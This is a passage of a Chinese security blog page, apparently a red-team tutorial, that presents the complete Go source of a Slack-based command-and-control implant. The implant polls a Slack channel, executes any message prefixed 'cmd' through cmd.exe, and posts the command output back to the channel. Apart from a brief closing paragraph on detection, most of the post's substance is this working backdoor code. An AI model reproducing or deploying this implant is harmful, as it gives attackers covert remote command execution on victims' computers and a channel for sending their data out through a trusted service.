class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>main.go</strong></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">	<span class="string">"os/exec"</span></span><br><span class="line">	utils <span class="string">"slackc2/core"</span></span><br><span class="line">	<span class="string">"strings"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/tidwall/gjson"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> <span class="literal">true</span> &#123;</span><br><span class="line">		req, err := http.NewRequest(<span class="string">"GET"</span>, utils.History_api, <span class="literal">nil</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Print(err)</span><br><span class="line">			os.Exit(<span class="number">1</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// GET URL  获取频道的字符串内容</span></span><br><span class="line">		q := req.URL.Query()</span><br><span class="line">		q.Add(<span class="string">"token"</span>, utils.Token)</span><br><span class="line">		q.Add(<span class="string">"channel"</span>, utils.Channel)</span><br><span class="line">		q.Add(<span class="string">"pretty"</span>, <span class="string">"1"</span>)</span><br><span class="line">		req.URL.RawQuery = q.Encode()</span><br><span class="line">		<span class="keyword">var</span> resp *http.Response</span><br><span class="line">		resp, err = http.DefaultClient.Do(req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Print(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// fmt.Println(url)</span></span><br><span class="line">		<span class="comment">//defer resp.Body.Close()</span></span><br><span class="line">		body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">		resp.Body.Close()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="comment">// handle error</span></span><br><span class="line">		&#125;</span><br><span class="line">		json := <span class="keyword">string</span>(body)</span><br><span class="line">		<span class="comment">//将GET URL 中的json值赋值给json变量</span></span><br><span class="line"></span><br><span class="line">		text := gjson.Get(json, <span class="string">"messages.0.text"</span>)</span><br><span class="line">		<span class="comment">// fmt.Print(text)</span></span><br><span class="line">		cmd := strings.Split(text.String(), <span class="string">" "</span>)</span><br><span class="line">		m := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">//定义列表命令</span></span><br><span class="line">			<span class="string">"cmd"</span>: &#123;&#125;,</span><br><span class="line">		&#125;</span><br><span class="line">		cmdlist := cmd[<span class="number">0</span>] <span class="comment">//slack频道输出的字符串第一个元素如果是列表中的就执行以下内容</span></span><br><span class="line">		<span class="comment">// fmt.Println(cmd[1])</span></span><br><span class="line">		<span class="keyword">if</span> _, run := m[cmdlist]; run &#123;</span><br><span class="line">			<span class="keyword">if</span> cmdlist == <span class="string">"cmd"</span> &#123;</span><br><span class="line">				<span class="comment">//判断接受过来的字符第一个元素是否为cmd字符串，【用于执行命令】</span></span><br><span class="line">				<span class="comment">// if runtime.GOOS == "windows" &#123;</span></span><br><span class="line">				command := exec.Command(<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd[<span class="number">1</span>])</span><br><span class="line">				<span class="comment">// &#125; else &#123;</span></span><br><span class="line">				<span class="comment">// 	command := exec.Command(cmd[1])</span></span><br><span class="line">				<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">				<span class="comment">//取值为第二元素为服务端接受的命令，并执行命令</span></span><br><span class="line">				stdoutStderr, err := command.CombinedOutput()</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Fatal(err)</span><br><span class="line">				&#125;</span><br><span class="line">				output := utils.ConvertByte2String(stdoutStderr, utils.GB18030)</span><br><span class="line">				str := <span class="string">"output-"</span> + output</span><br><span class="line">				<span class="comment">//以发送cmd输出的信息输出到output，并发送到频道</span></span><br><span class="line">				<span class="comment">// postMessage URL用于将输出的结果发送到slack频道中</span></span><br><span class="line">				req, err := http.NewRequest(<span class="string">"POST"</span>, utils.PostMessage, <span class="literal">nil</span>)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Print(err)</span><br><span class="line">					os.Exit(<span class="number">1</span>)</span><br><span class="line">				&#125;</span><br><span class="line">				p := req.URL.Query()</span><br><span class="line">				p.Add(<span class="string">"token"</span>, utils.Token)</span><br><span class="line">				p.Add(<span class="string">"channel"</span>, utils.Channel)</span><br><span class="line">				p.Add(<span class="string">"pretty"</span>, <span class="string">"1"</span>)</span><br><span class="line">				p.Add(<span class="string">"text"</span>, str)</span><br><span class="line">				req.URL.RawQuery = p.Encode()</span><br><span class="line">				<span class="keyword">var</span> resp *http.Response</span><br><span class="line">				resp, err = http.DefaultClient.Do(req)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					log.Print(err)</span><br><span class="line">				&#125;</span><br><span class="line">				body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">				<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">					<span class="comment">// handle error</span></span><br><span class="line">				&#125;</span><br><span class="line">				postMessage := <span class="keyword">string</span>(body)</span><br><span class="line">				OUTPUT := gjson.Get(postMessage, <span class="string">"message.0"</span>)</span><br><span class="line">				log.Println(OUTPUT)</span><br><span class="line">				<span class="comment">//fmt.Println()用于将输出的结果返回到slack频道中</span></span><br><span class="line">				resp.Body.Close()</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/Slackc2.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+
+
+
+<h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7.总结"></a>7.总结</h3><p>​    可以使用网络连接来关联未知或可疑过程活动的主机数据对于补充基于恶意软件命令和控制签名，基础结构或强加密的存在的任何现有危害指标至关重要。如果数据已加密，则数据包捕获分析将需要SSL/TLS检查。分析网络数据中不常见的数据流（例如，客户端发送的数据比从服务器接收的数据多得多）。行为监视可能有助于检测异常活动模式 。</p>
+<p><strong>参考链接：</strong></p>
+<p> <a href="https://github.com/bkup/SlackShell" target="_blank" rel="noopener">https://github.com/bkup/SlackShell</a> </p>
+<p> <a href="https://blog.csdn.net/systemino/article/details/97636359" target="_blank" rel="noopener">https://blog.csdn.net/systemino/article/details/97636359</a> </p>
+<p> <a href="https://api.slack.com/methods/chat.postMessage" target="_blank" rel="noopener">https://api.slack.com/methods/chat.postMessage</a> </p>
+<p> <a href="https://api.slack.com/methods/conversations.history" target="_blank" rel="noopener">https://api.slack.com/methods/conversations.history</a> </p>
+<p> <a href="https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019" target="_blank" rel="noopener">https://www.praetorian.com/blog/using-slack-as-c2-channel-mitre-attack-web-service-t1102?edition=2019</a> </p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/windows/" rel="tag">#windows</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/jishu.html" rel="prev">即刻安全纯技术交流群</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/metasploit后渗透模块编写ATT&CK-T1118.html" rel="next">Metasploit后渗透模块编写ATT&CK-T1118</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="slack C2 golang.html" data-title="slack C2 golang编写(T1102)" data-url="www.ggsec.cn/slack C2 golang.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">172</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">16</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-slack简介"><span class="nav-number">1.</span> <span class="nav-text">1.slack简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-slackC2"><span class="nav-number">2.</span> <span class="nav-text">2.slackC2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-客户端poc功能思路编写"><span class="nav-number">3.</span> <span class="nav-text">3.客户端poc功能思路编写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-API测试"><span class="nav-number">4.</span> <span class="nav-text">4.API测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-golang功能编写"><span class="nav-number">5.</span> <span class="nav-text">5.golang功能编写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-打印频道信息"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 打印频道信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-2-发送信息给频道"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 发送信息给频道</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-3指定命令标识"><span class="nav-number">5.3.</span> <span class="nav-text">5.3指定命令标识</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#完整效果"><span class="nav-number">6.</span> <span class="nav-text">完整效果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-完整代码"><span class="nav-number">7.</span> <span class="nav-text">6.完整代码</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#视频演示："><span class="nav-number"></span> <span class="nav-text">视频演示：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-总结"><span class="nav-number">1.</span> <span class="nav-text">7.总结</span></a></li></ol></li></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2020
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
